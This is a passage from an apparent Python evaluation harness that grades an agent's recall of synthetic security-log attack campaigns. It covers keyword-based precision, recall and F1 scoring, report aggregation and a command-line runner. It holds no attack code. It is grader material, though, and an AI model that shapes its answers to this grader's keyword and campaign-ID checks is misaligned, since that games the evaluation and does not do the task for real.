        if kw.lower() in answer_lower:
            matched.append(kw)
        else:
            missing.append(kw)

    total_required = len(question.required_keywords)
    if total_required == 0:
        recall = 1.0
    else:
        recall = len(matched) / total_required

    # Precision: penalize hallucinated campaign IDs
    mentioned_camps = []
    for camp_prefix in ["CAMP-"]:
        idx = 0
        while True:
            pos = answer.find(camp_prefix, idx)
            if pos < 0:
                break
            end = pos + 16  # CAMP-YYYY-NNN
            mentioned_camps.append(answer[pos:end])
            idx = pos + 1

    if mentioned_camps:
        correct_mentions = sum(
            1 for m in mentioned_camps if any(m.startswith(c) for c in question.campaign_ids)
        )
        precision = correct_mentions / len(mentioned_camps) if mentioned_camps else 1.0
    else:
        precision = 1.0 if recall > 0 else 0.0

    if precision + recall > 0:
        f1 = 2 * precision * recall / (precision + recall)
    else:
        f1 = 0.0

    # Score is weighted: 60% recall + 20% precision + 20% F1
    score = 0.6 * recall + 0.2 * precision + 0.2 * f1

    return SecurityGradeResult(
        question_id=question.question_id,
        category=question.category,
        score=score,
        precision=precision,
        recall=recall,
        f1=f1,
        matched_keywords=matched,
        missing_keywords=missing,
        answer_excerpt=answer[:200],
    )


# ============================================================
# Main Eval Class
# ============================================================


@dataclass
class SecurityEvalReport:
    """Complete evaluation report."""

    overall_score: float = 0.0
    overall_precision: float = 0.0
    overall_recall: float = 0.0
    overall_f1: float = 0.0
    category_scores: dict[str, dict[str, float]] = field(default_factory=dict)
    difficulty_scores: dict[str, float] = field(default_factory=dict)
    num_questions: int = 0
    num_turns: int = 0
    num_campaigns: int = 0
    learning_time_s: float = 0.0
    grading_time_s: float = 0.0
    results: list[dict] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "eval_type": "security_log_mde",
            "overall_score": self.overall_score,
            "overall_precision": self.overall_precision,
            "overall_recall": self.overall_recall,
            "overall_f1": self.overall_f1,
            "category_scores": self.category_scores,
            "difficulty_scores": self.difficulty_scores,
            "num_questions": self.num_questions,
            "num_turns": self.num_turns,
            "num_campaigns": self.num_campaigns,
            "learning_time_s": self.learning_time_s,
            "grading_time_s": self.grading_time_s,
            "results": self.results,
        }


class SecurityLogEval:
    """MDE-style security log evaluation for distributed hive mind.

    Generates realistic MDE telemetry across multiple attack campaigns,
    feeds it to agents via learn_from_content(), then tests retrieval
    with precision/recall grading.

    The data volume is configurable — at 50K+ turns, it exceeds single-agent
    memory capacity, requiring the distributed hive for full coverage.
    """

    def __init__(
        self,
        num_turns: int = 10000,
        num_questions: int = 100,
        num_campaigns: int = 12,
        noise_ratio: float = 0.6,
        seed: int = 42,
    ):
        self.num_turns = num_turns
        self.num_questions = num_questions
        self.num_campaigns = num_campaigns
        self.noise_ratio = noise_ratio  # fraction of events that are benign noise
        self.seed = seed

        self.campaigns: list[AttackCampaign] = []
        self.events: list[dict] = []
        self.questions: list[SecurityQuestion] = []

    def generate(self) -> None:
        """Generate campaigns, events, and questions deterministically."""
        rng = random.Random(self.seed)

        # Generate attack campaigns
        self.campaigns = _generate_campaigns(rng, self.num_campaigns)
        logger.info("Generated %d attack campaigns", len(self.campaigns))

        # Generate campaign events
        campaign_events = []
        for camp in self.campaigns:
            campaign_events.extend(_generate_campaign_events(rng, camp))

        # Calculate noise events to reach target turn count
        num_noise = max(0, self.num_turns - len(campaign_events))
        noise_events = _generate_noise_events(
            rng,
            num_noise,
            max(c.start_day + c.duration_days for c in self.campaigns),
        )

        # Interleave campaign and noise events
        self.events = campaign_events + noise_events
        rng.shuffle(self.events)

        # Truncate to target
        self.events = self.events[: self.num_turns]

        # Generate questions
        self.questions = _generate_questions(self.campaigns, rng, self.num_questions)

        logger.info(
            "Generated %d events (%d campaign, %d noise), %d questions",
            len(self.events),
            len(campaign_events),
            len(noise_events),
            len(self.questions),
        )

    def run(self, agent: Any, grader_model: str = "") -> SecurityEvalReport:
        """Run the complete evaluation.

        Args:
            agent: Object with learn_from_content(str) and answer_question(str) methods.
                   Works with both local LearningAgent and RemoteAgentAdapter.
            grader_model: Unused (grading is deterministic keyword-based).

        Returns:
            SecurityEvalReport with precision, recall, F1 per category.
        """
        logger.info(
            "Starting security log eval: %d turns, %d questions, %d campaigns",
            self.num_turns,
            self.num_questions,
            self.num_campaigns,
        )

        # Step 1: Generate data
        self.generate()

        # Step 2: Feed events to agent
        t0 = time.time()
        for i, event in enumerate(self.events):
            agent.learn_from_content(event["content"])
            if (i + 1) % 500 == 0:
                logger.info(
                    "Fed %d/%d events (%.1f turns/s)",
                    i + 1,
                    len(self.events),
                    (i + 1) / (time.time() - t0),
                )
        learning_time = time.time() - t0
        logger.info("Learning phase complete: %.1fs", learning_time)

        # Step 3: Quiz and grade
        t1 = time.time()
        results = []
        for i, q in enumerate(self.questions):
            answer = agent.answer_question(q.question)
            grade = _grade_answer(q, answer)
            results.append(grade)
            if (i + 1) % 20 == 0:
                logger.info(
                    "Graded %d/%d questions (avg score: %.2f%%)",
                    i + 1,
                    len(self.questions),
                    sum(r.score for r in results) / len(results) * 100,
                )
        grading_time = time.time() - t1

        # Step 4: Aggregate scores
        report = self._aggregate(results, learning_time, grading_time)
        self._print_report(report)
        return report

    def _aggregate(
        self, results: list[SecurityGradeResult], learning_time: float, grading_time: float
    ) -> SecurityEvalReport:
        """Aggregate individual grades into a report."""
        report = SecurityEvalReport(
            num_questions=len(results),
            num_turns=len(self.events),
            num_campaigns=len(self.campaigns),
            learning_time_s=learning_time,
            grading_time_s=grading_time,
        )

        if not results:
            return report

        # Overall
        report.overall_score = sum(r.score for r in results) / len(results)
        report.overall_precision = sum(r.precision for r in results) / len(results)
        report.overall_recall = sum(r.recall for r in results) / len(results)
        report.overall_f1 = sum(r.f1 for r in results) / len(results)

        # By category
        categories: dict[str, list[SecurityGradeResult]] = {}
        for r in results:
            categories.setdefault(r.category, []).append(r)
        for cat, cat_results in categories.items():
            n = len(cat_results)
            report.category_scores[cat] = {
                "score": sum(r.score for r in cat_results) / n,
                "precision": sum(r.precision for r in cat_results) / n,
                "recall": sum(r.recall for r in cat_results) / n,
                "f1": sum(r.f1 for r in cat_results) / n,
                "count": n,
            }

        # By difficulty
        difficulties: dict[str, list[SecurityGradeResult]] = {}
        for q, r in zip(self.questions, results, strict=False):
            difficulties.setdefault(q.difficulty, []).append(r)
        for diff, diff_results in difficulties.items():
            report.difficulty_scores[diff] = sum(r.score for r in diff_results) / len(diff_results)

        # Individual results
        report.results = [
            {
                "question_id": r.question_id,
                "category": r.category,
                "score": r.score,
                "precision": r.precision,
                "recall": r.recall,
                "f1": r.f1,
                "matched": r.matched_keywords,
                "missing": r.missing_keywords,
                "answer": r.answer_excerpt,
            }
            for r in results
        ]

        return report

    @staticmethod
    def _print_report(report: SecurityEvalReport) -> None:
        """Print a formatted report to the logger."""
        logger.info("=" * 70)
        logger.info("SECURITY LOG EVAL RESULTS")
        logger.info("=" * 70)
        logger.info(
            "Overall: Score=%.2f%%  Precision=%.2f%%  Recall=%.2f%%  F1=%.2f%%",
            report.overall_score * 100,
            report.overall_precision * 100,
            report.overall_recall * 100,
            report.overall_f1 * 100,
        )
        logger.info("-" * 70)
        logger.info("%-20s %8s %8s %8s %8s %5s", "Category", "Score", "Prec", "Recall", "F1", "N")
        for cat, scores in sorted(report.category_scores.items()):
            logger.info(
                "%-20s %7.2f%% %7.2f%% %7.2f%% %7.2f%% %5d",
                cat,
                scores["score"] * 100,
                scores["precision"] * 100,
                scores["recall"] * 100,
                scores["f1"] * 100,
                int(scores["count"]),
            )
        logger.info("-" * 70)
        logger.info("%-20s %8s", "Difficulty", "Score")
        for diff, score in sorted(report.difficulty_scores.items()):
            logger.info("%-20s %7.2f%%", diff, score * 100)
        logger.info(
            "Turns: %d | Questions: %d | Campaigns: %d | Learning: %.1fs | Grading: %.1fs",
            report.num_turns,
            report.num_questions,
            report.num_campaigns,
            report.learning_time_s,
            report.grading_time_s,
        )
        logger.info("=" * 70)


# ============================================================
# CLI entry point
# ============================================================


def main():
    import argparse
    import sys

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(name)s] %(levelname)s: %(message)s",
    )

    p = argparse.ArgumentParser(description="MDE Security Log Eval")
    p.add_argument("--turns", type=int, default=10000)
    p.add_argument("--questions", type=int, default=100)
    p.add_argument("--campaigns", type=int, default=12)
    p.add_argument("--seed", type=int, default=42)
    p.add_argument("--output", default="")
    p.add_argument("--grader-model", default="")
    args = p.parse_args()

    # Import agent
    sys.path.insert(0, "src")
    from amplihack.agents.goal_seeking.learning_agent import LearningAgent

    agent = LearningAgent()
    eval_harness = SecurityLogEval(
        num_turns=args.turns,
        num_questions=args.questions,
        num_campaigns=args.campaigns,
        seed=args.seed,
    )

    try:
        report = eval_harness.run(agent, grader_model=args.grader_model)
    finally:
        if hasattr(agent, "close"):
            agent.close()

    output_path = args.output or f"/tmp/security_eval_{args.seed}.json"
    with open(output_path, "w") as f:
        json.dump(report.to_dict(), f, indent=2)
    logger.info("Report written to %s", output_path)


if __name__ == "__main__":
    main()
